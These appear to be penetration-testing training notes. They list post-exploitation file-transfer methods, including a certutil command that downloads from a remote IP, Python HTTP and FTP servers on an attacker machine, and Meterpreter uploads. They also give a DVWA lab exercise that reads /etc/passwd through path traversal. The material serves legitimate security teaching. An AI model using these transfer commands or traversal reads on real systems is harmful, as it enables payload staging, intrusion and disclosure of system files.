Post Exploitation – Path (Directory) Traversal  	File Transfer Review: 
 	 	Certutil:  
Example: certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt  
 	 	HTTP: 
 	 	 	Example: python -m SimpleHTTPServer 80 
 	 	Browser: 
 	 	 	Navigate directly to file 
 	 	FTP: 
 	 	 	Example: python -m pyftpdlib 21 (attacker machine) 
 	 	 	ftp 10.10.10.10   	 	Linux: 
 	 	 	wget command 
 	 	Metasploit:  
has the upload/download feature so if you have merterpreter shell it is very easy to upload or download a file 
Exercise 18: Path (Directory) Traversal 
1.	Go to the Damn Vulnerable Web Application (DVWA) in WebSploit and navigate to File Inclusion. 
2.	Select any of the PHP file links. 
3.	Attempt to get the contents of the /etc/passwd file by manipulating the URL, as demonstrated below: 
  
You should see the contents of the /etc/passwd file, as shown in the example in the next page. 
  
That was too easy… The next exercise (our final exercise) will not be this easy… 
 

<img width="471" height="533" alt="image" src="https://github.com/user-attachments/assets/f9f1d9f5-106c-4322-9b64-24d72c3696b4" />

